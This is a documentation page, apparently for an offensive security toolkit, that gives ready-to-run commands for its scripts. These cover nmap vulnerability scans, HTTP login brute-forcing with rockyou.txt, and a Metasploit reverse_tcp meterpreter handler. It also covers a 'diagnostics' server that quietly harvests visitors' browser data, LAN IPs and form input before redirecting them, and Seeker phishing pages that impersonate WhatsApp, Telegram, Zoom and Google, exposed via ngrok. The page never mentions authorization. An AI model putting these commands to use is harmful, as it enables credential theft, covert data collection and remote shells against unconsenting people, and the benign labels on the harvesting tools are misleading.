# Standalone Scripts

Everything in `scripts/` drives the **same engine** as the menu and UI, so
reports, progress bars, logging and exit codes behave identically. Scripts
are ideal for automation, cron jobs and CI where interactive prompts are not
wanted.

All examples assume you are in the repository root (or the install prefix)
with the venv active.

## `nmap_vuln.py` — NSE vulnerability scan

```bash
python scripts/nmap_vuln.py scanme.nmap.org
python scripts/nmap_vuln.py 192.168.1.0/24 --ports 445,139 --scripts vuln,safe --timeout 900
python scripts/nmap_vuln.py 10.0.0.5 --extra -sV --extra --script-args=unsafe=1
```

| Flag | Default | Purpose |
| ---- | ------- | ------- |
| `target` (positional) | — | host, IP or CIDR |
| `--ports` | *(none)* | comma-separated port list |
| `--scripts` | `vuln` | NSE script family or comma list |
| `--timeout` | `600` | seconds |
| `--extra ARG` | *(none)* | extra nmap argument, repeatable |

Exit codes: `0` scan completed · `1` failed or unavailable.

## `http_bruteforce.py` — login credential testing

```bash
python scripts/http_bruteforce.py https://host/login --user admin \
    --passwords-file words.txt
python scripts/http_bruteforce.py https://host/login --mode form \
    --users-file users.txt --passwords-file rockyou.txt \
    --success-marker "Welcome back" --delay 0.2
```

| Flag | Default | Purpose |
| ---- | ------- | ------- |
| `url` (positional) | — | login URL (https:// added if missing) |
| `--mode` | `basic` | `basic` or `form` |
| `--user` / `--users-file` | — | single username or username wordlist |
| `--passwords-file` | built-in weak list | password wordlist |
| `--success-marker` / `--fail-marker` | — | text that identifies success/failure pages |
| `--user-field` / `--pass-field` | `username` / `password` | form field names |
| `--extra-fields K=V,…` | — | extra form fields (CSRF is auto-captured) |
| `--delay` | `0.05` | seconds between attempts |
| `--timeout` | `8` | per-request timeout |

Runs are capped at **5 000 attempts** and **200 000 wordlist lines**. Without
success/fail markers, form hits are reported as *possible*, never confirmed.

## `auto_audit.py` — read-only vulnerability audit

```bash
python scripts/auto_audit.py <target> [--ports 22,80] [--os-detect]
```

Runs one nmap service scan, then reports **candidate findings only** —
outdated versions, default configs, weak auth surfaces — from a built-in
knowledge base. It never exploits or modifies the target. `--os-detect`
needs root and is skipped with a warning otherwise.

## `msf_run.py` — Metasploit via RPC

```bash
msfrpcd -P <password> -a 127.0.0.1 -p 55553
export MSF_RPC_PASSWORD=<password>

python scripts/msf_run.py scanner/portscan/tcp --target 10.0.0.5 --option THREADS=10
python scripts/msf_run.py exploit/multi/handler --type exploit \
    --payload linux/x64/meterpreter/reverse_tcp --option LHOST=10.0.0.1
```

| Flag | Default | Purpose |
| ---- | ------- | ------- |
| `module` (positional) | — | MSF module path (`scanner/portscan/tcp`) |
| `--type` | `auxiliary` | `auxiliary` / `exploit` / `post` |
| `--target` | — | wired into `RHOSTS` automatically |
| `--option K=V` | — | datastore option, repeatable |
| `--payload` | — | payload for exploit modules |

Exit codes: `0` module ran · `1` failed or daemon unreachable.

## `data_scraper.py` — diagnostics & event logger

```bash
python scripts/data_scraper.py --port 8080 --redirect https://example.com
python scripts/data_scraper.py --qrcode --ngrok -v
python scripts/data_scraper.py --duration 30   # auto-stop after 30 s
```

Serves a blank diagnostics page on **all interfaces** (prints the LAN URL so
any device on the network can connect) and streams every connection — browser
environment, LAN IPs, connectivity probes, UI events, form data — into the
terminal and the framework log. A startup blocker check covers
self-reachability, ngrok and the OS firewall. The server runs until the
window closes or Ctrl+C.

| Flag | Default | Purpose |
| ---- | ------- | ------- |
| `--port` | `8080` | bind port |
| `--redirect` | `https://www.google.com` | post-collection redirect (empty = none) |
| `--qrcode` | off | ASCII QR of the localhost URL |
| `--ngrok` | off | public URL via ngrok binary |
| `--duration` | `0` | auto-stop after N seconds |
| `-v` | off | verbose framework logging |

Exit codes: `0` session ran · `2` run failed · `130` interrupted.

## `seeker.py` — Seeker hosting console

```bash
python scripts/seeker.py --template NearYou --port 8080
python scripts/seeker.py --template Telegram --port 8080 --tunnel
```

Starts the bundled upstream Seeker as a background subprocess and renders its
output in one operator console (upstream never opens a second terminal).
Missing Git/PHP/Python dependencies are checked and installed where possible
before launch. The console prints the local URL, the LAN URL, startup status
and structured output; closing the console stops the hosting process.

| Flag | Env default | Purpose |
| ---- | ----------- | ------- |
| `--template` | `SEEKER_DEFAULT_TEMPLATE=NearYou` | NearYou, WhatsApp, Telegram, Zoom, Google Drive, Google reCAPTCHA |
| `--port` | `SEEKER_DEFAULT_PORT=8080` | local port |
| `--tunnel` | off | expose via ngrok |
| `--timeout` | `SEEKER_TIMEOUT=60` | wait for the generated link |
| `--path` | `SEEKER_PATH` (bundled) | custom upstream script path |

## `self_test.py` — full self-test

```bash
python scripts/self_test.py           # full run (needs network for some modules)
python scripts/self_test.py --no-net  # skip internet-only modules
```

See [Testing](Testing) for what it covers.
